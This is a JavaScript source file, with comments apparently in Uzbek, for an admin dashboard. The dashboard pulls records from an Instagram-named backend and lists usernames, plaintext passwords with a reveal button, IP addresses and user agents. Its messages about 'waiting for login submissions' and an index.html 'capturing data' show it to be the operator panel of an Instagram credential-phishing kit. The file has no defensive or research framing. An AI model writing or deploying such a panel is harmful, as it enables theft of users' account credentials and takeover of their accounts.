document.addEventListener('DOMContentLoaded', function() {
    const backendUrl = 'https://instagram-ek8i.onrender.com';
    console.log('Dashboard loaded, backend URL:', backendUrl);

    // Test endpointlarni tekshirish
    const testEndpoints = [
        '/health',
        '/logs', 
        '/test',
        '/'
    ];

    async function testAllEndpoints() {
        const results = [];
        for (const endpoint of testEndpoints) {
            try {
                const response = await fetch(backendUrl + endpoint);
                results.push({
                    endpoint,
                    status: response.status,
                    ok: response.ok
                });
                console.log(`${endpoint}: ${response.status} ${response.ok ? '✅' : '❌'}`);
            } catch (error) {
                results.push({
                    endpoint,
                    error: error.message,
                    ok: false
                });
                console.log(`${endpoint}: ❌ ${error.message}`);
            }
        }
        return results;
    }

    async function loadLogsDirect() {
        try {
            console.log('🔄 Direct logs loading...');
            
            // 1. Avval simple logs ni sinab ko'rish
            const response = await fetch(`${backendUrl}/logs`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                },
                mode: 'cors'
            });

            console.log('📊 Response status:', response.status);
            
            if (response.ok) {
                const data = await response.json();
                console.log('📦 Logs data:', data);
                
                if (data.status === 'error') {
                    // Agar error bo'lsa, manual database query qilish
                    await loadManualLogs();
                } else {
                    displayLogs(data);
                }
            } else {
                // Fallback: index.html ga yo'naltirish yoki error
                console.warn('⚠️ Logs endpoint failed, trying manual load...');
                await loadManualLogs();
            }
            
        } catch (error) {
            console.error('💥 Error:', error);
            showEmergencyMessage(error.message);
        }
    }

    async function loadManualLogs() {
        try {
            console.log('🔧 Manual logs loading...');
            
            // Emergency fallback: localStorage dan olish
            const localLogs = localStorage.getItem('instagram_logs');
            if (localLogs) {
                const logs = JSON.parse(localLogs);
                console.log('📁 Found local logs:', logs.length);
                
                displayManualLogs(logs);
            } else {
                showNoDataMessage();
            }
            
        } catch (error) {
            console.error('💥 Manual load error:', error);
            showEmergencyMessage('Database not accessible. Check backend logs.');
        }
    }

    function displayLogs(data) {
        // Status
        document.getElementById('backendStatus').innerHTML = 
            `<i class="fas fa-check-circle" style="color:#10b981"></i> Online`;
        
        // Stats
        document.getElementById('totalRecords').textContent = data.total || 0;
        document.getElementById('todayRecords').textContent = data.today || 0;
        document.getElementById('lastRecord').textContent = data.last ? 
            new Date(data.last).toLocaleTimeString('uz-UZ') : '--:--';
        document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');

        // Table
        const tbody = document.getElementById('logsBody');
        tbody.innerHTML = '';

        if (data.logs && data.logs.length > 0) {
            data.logs.forEach(log => {
                const row = tbody.insertRow();
                const time = log.timestamp ? new Date(log.timestamp) : new Date();
                
                row.innerHTML = `
                    <td>${log.id || 'N/A'}</td>
                    <td><strong>${log.username || 'N/A'}</strong></td>
                    <td class="password-cell">
                        <span class="password-text">${'•'.repeat((log.password || '').length)}</span>
                        ${log.password ? 
                            `<button onclick="showPassword(this)" 
                                    data-password="${btoa(log.password)}"
                                    style="margin-left: 8px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 6px; border-radius: 4px; cursor: pointer; font-size: 12px;">
                                Show
                            </button>` : ''}
                    </td>
                    <td>${time.toLocaleString('uz-UZ')}</td>
                    <td>${log.ip_address || 'N/A'}</td>
                    <td title="${log.user_agent || ''}">${(log.user_agent || 'Unknown').substring(0, 30)}...</td>
                `;
            });
        } else {
            showNoDataMessage();
        }
    }

    function displayManualLogs(logs) {
        document.getElementById('backendStatus').innerHTML = 
            `<i class="fas fa-exclamation-triangle" style="color:#fbbf24"></i> Local Data`;
        
        document.getElementById('totalRecords').textContent = logs.length;
        document.getElementById('todayRecords').textContent = logs.filter(log => 
            new Date(log.savedAt).toDateString() === new Date().toDateString()
        ).length;
        
        const tbody = document.getElementById('logsBody');
        tbody.innerHTML = '';

        logs.slice(0, 20).forEach((log, index) => {
            const row = tbody.insertRow();
            const time = log.timestamp ? new Date(log.timestamp) : new Date(log.savedAt);
            
            row.innerHTML = `
                <td>${index + 1}</td>
                <td><strong>${log.username || 'N/A'}</strong></td>
                <td class="password-cell">
                    <span class="password-text">${'•'.repeat((log.password || '').length)}</span>
                    ${log.password ? 
                        `<button onclick="showPassword(this)" 
                                data-password="${btoa(log.password)}"
                                style="margin-left: 8px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 6px; border-radius: 4px; cursor: pointer; font-size: 12px;">
                            Show
                        </button>` : ''}
                </td>
                <td>${time.toLocaleString('uz-UZ')}</td>
                <td>${log.ip || log.ip_address || 'N/A'}</td>
                <td title="${log.userAgent || ''}">${(log.userAgent || 'Unknown').substring(0, 30)}...</td>
            `;
        });

        if (logs.length === 0) {
            showNoDataMessage();
        }
    }

    function showNoDataMessage() {
        const tbody = document.getElementById('logsBody');
        tbody.innerHTML = `
            <tr>
                <td colspan="6" style="text-align:center;padding:60px 20px;color:#94a3b8;">
                    <i class="fas fa-database" style="font-size:48px;margin-bottom:15px;opacity:0.3;"></i>
                    <h3 style="margin:10px 0;">No Data Found</h3>
                    <p>Waiting for login submissions...</p>
                    <p><small>Check if index.html is receiving submissions</small></p>
                </td>
            </tr>
        `;
    }

    function showEmergencyMessage(message) {
        document.getElementById('backendStatus').innerHTML = 
            `<i class="fas fa-times-circle" style="color:#ef4444"></i> Error`;
        
        const tbody = document.getElementById('logsBody');
        tbody.innerHTML = `
            <tr>
                <td colspan="6" style="text-align:center;padding:40px;color:#ef4444;background:#1e293b;border-radius:8px;">
                    <i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:15px;"></i>
                    <h3 style="margin:10px 0;">Backend Connection Error</h3>
                    <p style="margin:10px 0;">${message}</p>
                    <div style="margin-top:20px;">
                        <button onclick="location.reload()" 
                                style="padding:10px 20px;background:#3b82f6;color:white;border:none;border-radius:6px;cursor:pointer;margin:5px;">
                            <i class="fas fa-sync-alt"></i> Reload
                        </button>
                        <button onclick="testConnection()" 
                                style="padding:10px 20px;background:#10b981;color:white;border:none;border-radius:6px;cursor:pointer;margin:5px;">
                            <i class="fas fa-wifi"></i> Test Connection
                        </button>
                    </div>
                    <div style="margin-top:20px;font-size:12px;color:#94a3b8;">
                        <p>Check backend at: <a href="${backendUrl}" target="_blank" style="color:#60a5fa;">${backendUrl}</a></p>
                        <p>Index.html should still work for capturing data.</p>
                    </div>
                </td>
            </tr>
        `;
    }

    // Global functions
    window.showPassword = function(button) {
        const passwordSpan = button.parentElement.querySelector('.password-text');
        const encodedPassword = button.getAttribute('data-password');
        
        if (passwordSpan.textContent.includes('•')) {
            try {
                const realPassword = atob(encodedPassword);
                passwordSpan.textContent = realPassword;
                button.textContent = 'Hide';
            } catch (e) {
                passwordSpan.textContent = 'Error';
            }
        } else {
            passwordSpan.textContent = '•'.repeat(atob(encodedPassword).length);
            button.textContent = 'Show';
        }
    };

    window.testConnection = async function() {
        alert('Testing connection...');
        await testAllEndpoints();
        await loadLogsDirect();
    };

    window.exportCSV = function() {
        alert('Export feature will be available when backend is fully working.');
    };

    window.clearLogs = function() {
        if (confirm('Clear all local logs?')) {
            localStorage.removeItem('instagram_logs');
            location.reload();
        }
    };

    // Start
    console.log('🚀 Starting dashboard...');
    testAllEndpoints().then(results => {
        const workingEndpoints = results.filter(r => r.ok);
        if (workingEndpoints.length > 0) {
            console.log('✅ Working endpoints:', workingEndpoints.map(r => r.endpoint));
            loadLogsDirect();
        } else {
            console.log('❌ No working endpoints');
            showEmergencyMessage('No endpoints responding. Backend may be down.');
        }
    });

    // Auto-refresh every 30 seconds
    setInterval(() => {
        document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');
    }, 1000);
});
